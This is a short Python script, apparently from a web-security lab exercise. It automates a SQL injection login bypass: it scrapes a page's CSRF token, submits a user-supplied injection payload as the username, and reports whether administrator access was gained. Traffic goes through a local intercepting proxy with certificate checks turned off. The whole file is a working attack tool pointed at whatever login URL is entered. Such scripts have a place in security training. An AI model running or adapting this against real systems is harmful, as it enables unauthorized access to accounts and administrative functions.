import requests
import sys
import argparse
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXIES = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}


def normalize_url(url):
    if not url.startswith(("http://", "https://")):
        return "https://" + url
    return url


def get_csrf_token(session, url):
    r = session.get(url, verify=False, proxies=PROXIES)
    soup = BeautifulSoup(r.text, "html.parser")

    csrf_input = soup.find("input", {"name": "csrf"})
    if not csrf_input:
        raise RuntimeError("CSRF token not found")

    return csrf_input["value"]


def exploit_sqli(session, url, payload):
    csrf = get_csrf_token(session, url)

    data = {
        "csrf": csrf,
        "username": payload,
        "password": "randomtext"
    }

    r = session.post(url, data=data, verify=False, proxies=PROXIES)
    return "Log out" in r.text


def main():
    parser = argparse.ArgumentParser(description="SQLi login checker")
    parser.add_argument("url", nargs="?", help="Target login URL")
    parser.add_argument("payload", nargs="?", help="SQL injection payload")

    args = parser.parse_args()

    # Interactive fallback
    url = args.url or input("Enter target URL: ").strip()
    payload = args.payload or input("Enter SQL payload: ").strip()

    url = normalize_url(url)

    session = requests.Session()

    try:
        if exploit_sqli(session, url, payload):
            print("[+] SQL injection successful! Administrator access obtained.")
        else:
            print("[-] SQL injection unsuccessful.")
    except Exception as e:
        print(f"[!] Error: {e}")


if __name__ == "__main__":
    main()
